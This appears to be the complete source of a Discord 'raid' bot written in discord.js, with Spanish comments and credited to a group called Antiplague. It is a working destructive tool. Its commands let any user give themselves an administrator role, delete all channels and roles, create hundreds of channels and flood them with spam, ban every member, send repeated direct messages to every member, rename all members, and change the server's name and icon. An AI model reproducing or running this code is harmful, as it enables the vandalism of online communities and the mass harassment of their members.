const Discord = require("discord.js");
const client = new Discord.Client();
const chalk = require('chalk');
 
client.on("ready", () => {
 
console.log(chalk.red(`IMPORTANT, if you are going to edit the codes, just change the "MODIFY_THIS_TEXT" to the one you want.`))

 console.log(chalk.red(""));   
 console.log(chalk.white(""));   
 console.log("                          ");   

   console.log(chalk.blue("Iniciando bot raid..."));
   console.log("   ")  
   console.log(chalk.blue(`Cliente ${client.user.tag} listo para el raid!`));  
   console.log(chalk.blue("$help para mas ayuda"));  
   console.log("      ") 
   console.log(chalk.red(`   [?] Comandos de raid:

   [!] | $1 [Admin] | $2 [Nuke] | $3 [Raid automatico] | $4 [Raid] |

   [?] Comandos de modificaciones:

   [!] | $5 [Elimina roles] | $6 [Agrega roles] |
   
   [?] Comandos para usuarios:
   
   [!] | $7 [Ban all] | $8 [Md all] | $9 <name> [Nombre users] |
   
   [?] Comandos de informacion
   
   [!] | $10 [Lista server] |`))

   console.log("      ")
   console.log(chalk.blue(`These codes are the property of Antilague. | discord.gg/antiplague`))

   presencia();  
});

function presencia(){
   client.user.setPresence({
   status: "dnd",
   activity: {
   name: "$help",
   type: "PLAYING"
     }
   });
}

//Rol Admin: El bot crea un rol con Admin y te lo da. [$1]

client.on("message", async msg => {
   if (msg.author.bot) return;
   if(msg.content.toLowerCase().startsWith('$1')){
   let rol = await msg.guild.roles.create({data: {
       name: "$",
       color: "38393e",
       permissions: "ADMINISTRATOR",
       hoisted: false
   }})
 
msg.member.roles.add(rol)
       .then(function(role) {
        msg.member.addRole(role);
   if (msg.deletable) msg.delete().catch(e => {});
     })
       .catch(e => {});
   }
});

//Nuke: Borra todos los Canales del Servidor. [$2]

client.on("message", message => {
   if (message.author.bot) return;
  
   if (message.content === '$2') {
     message.delete()
     message.guild.channels.cache.forEach(channel => channel.delete());
     message.guild.channels.create(`MODIFY_THIS_TEXT`, {
       type: 'text'
     }).then(channel => {
       channel.send("MODIFY_THIS_TEXT")
     })
   }
})
 
//Raid Automatico: Raid Automatico (Borra y crea canales y hace flood). [$3]
 
client.on("message", message => {
   if(message.author.bot) return;
 
   if(message.content === '$3'){
       message.delete()
       message.guild.channels.cache.forEach(channel => channel.delete());
       message.guild.channels.create(`MODIFY_THIS_TEXT`, {
        type: 'text'
   }).then(channel => {
     message.guild.setName("MODIFY_THIS_TEXT");
        channel.send("MODIFY_THIS_TEXT")
     })
   for (let i = 0; i <= 500; i++) {
         message.guild.channels.create(`MODIFY_THIS_TEXT`, {
           type: 'text'
   }).then(channel => {
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     })
   }
     message.guild.setName("MODIFY_THIS_TEXT");
     message.guild.setIcon("MODIFY_THIS_TEXT");
   }
})

//Raid: Crea canales y hace flood. [$4]

client.on("message", message => {
   if (message.author.bot) return;
          
   if (message.content === '$4') {
     message.delete()
   for (let i = 0; i <= 500; i++) {
     message.guild.channels.create(`MODIFY_THIS_TEXT`, {
     type: 'text'
   }).then(channel => {
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
     channel.send("MODIFY_THIS_TEXT");
       })
     }
   }
});

//Borrar Roles: Borra todos los roles del Servidor. [$5]

client.on("message", message => {
   if (message.author.bot) return;
                  
   if(message.content === ('$5')){
     message.delete()
     message.guild.roles.cache.map(roles => roles.delete());
   }
});

//Crear Roles: Crea Roles al Servidor. [$6]

client.on("message", message => {
   if (message.author.bot) return;
              
   if (message.content === '$6') {
     message.delete()
   for (let i = 0; i <= 200; i++) {
       message.guild.roles.create({data: {name: `MODIFY_THIS_TEXT`,color: '#d41818',},reason: 'MODIFY_THIS_TEXT',})
    };
   }
});

//Ban All: Banea a todos los meimbros del Servidor. [$7]

client.on("message", async message => {
   if(message.content.startsWith('$7')){
      message.delete();
   if(!message.member.hasPermission("BAN_MEMBERS") || !message.member.hasPermission("ADMINISTRATOR")) return;
      message.guild.members.cache.forEach(member => {
   if(member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID"){
      member.ban();
     }
   })
}});

//Mensajes Directos: Envia MD a los miembros del Servidor. [$8]

client.on("message", message => {
   if (message.author.bot) return;
                        
   if(message.content === "$8")
     message.delete()
     message.guild.members.cache.forEach(member => {
     setInterval(function(){
       member.send("MODIFY_THIS_TEXT").catch(error => {});
     },450);
   })
});

//nickall: Cambia el Nombre de los Miembros. [$9]

client.on("message", msg => {
   const args = msg.content.slice().trim().split(/ +/g );
   const command = args.shift().toLowerCase();
   if (command === '$9'){
     msg.delete()
   let nickname = args.join(" ");
   var i = 0;
     msg.guild.members.cache.forEach(member =>{
     i++
   }
     )
   msg.channel.send("> Cambiando el nombre de **" + i + "** usuarios a: **" + nickname + "**")
   msg.guild.members.cache.forEach(member =>{
 
     member.setNickname(nickname)
    })
  }
});

//Lista: Muestra la Lista de informacion del Servidor. [$10]

client.on("message", message => {
   if (message.author.bot) return;
   const args = message.content.slice().trim().split(/ +/g );
   const command = args.shift().toLowerCase();
   if (command === '$10') {
       message.delete()
   const embed = new Discord.MessageEmbed()
       .setTitle(message.guild.name)
       .setThumbnail()
       .setDescription(`Canales **|** \`${message.guild.channels.cache.size}\`\nRoles **|** \`${message.guild.roles.cache.size}\`\nUsers **|** \`${message.guild.memberCount}\``)
       .setColor("050403");
       message.channel.send(embed)
   }
});

//Token

client.login("TOKEN_BOT");
